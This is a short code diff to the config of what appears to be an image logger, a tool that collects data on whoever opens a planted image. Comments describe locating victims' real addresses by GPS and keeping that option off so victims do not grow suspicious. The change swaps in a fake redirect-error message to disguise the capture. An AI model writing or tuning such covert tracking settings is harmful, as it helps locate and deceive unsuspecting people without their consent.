@@ -27,8 +27,8 @@ config = {
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "Cant not redirect to https://store.steampowered.com/ ", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "There was an error redirecting you Please try again later.", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
